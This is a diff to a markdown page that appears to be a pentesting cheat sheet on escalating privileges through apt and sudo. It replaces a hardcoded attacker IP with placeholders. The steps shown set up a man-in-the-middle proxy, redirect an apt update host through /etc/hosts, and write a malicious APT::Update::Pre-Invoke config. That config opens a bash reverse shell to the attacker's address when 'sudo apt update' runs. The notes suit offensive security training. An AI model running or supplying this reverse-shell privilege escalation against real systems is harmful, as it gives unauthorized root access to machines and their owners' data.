@@ -4,15 +4,14 @@ date: 2024-7-4
 tags: ["apt", "update", "privesc", "pre-invoke", "sudo"]
 ---
 
----
 ### MITM (Man-in-the-Middle)
 
 #### 1. Add proxy path in target machine
 
 <div>
 
-```bash
-export http_proxy=http://10.10.14.10:8888
+```console
+export http_proxy=http://<LOCAL_IP>:<LOCAL_PROXY_PORT>
 ```
 
 </div>
@@ -21,14 +20,14 @@ export http_proxy=http://10.10.14.10:8888
 
 <div>
 
-```bash
+```console
 # Tool
 pip3 install --upgrade proxy.py
 ```
 
-```bash
+```console
 # Start a proxy server
-proxy --hostname 0.0.0.0 --port 8888
+proxy --hostname 0.0.0.0 --port <LOCAL_PROXY_PORT>
 ```
 
 </div>
@@ -37,9 +36,9 @@ proxy --hostname 0.0.0.0 --port 8888
 
 <div>
 
-```bash
+```console
 # Edit /etc/hosts
-10.10.14.10 apt.update.example.com
+<LOCAL_IP> apt.update.example.com
 ```
 
 </div>
@@ -52,12 +51,12 @@ proxy --hostname 0.0.0.0 --port 8888
 
 <div>
 
-```bash
+```console
 # Create a malicious config
-echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
+echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
 ```
 
-```bash
+```console
 # Exploit
 sudo apt update -y
 ```
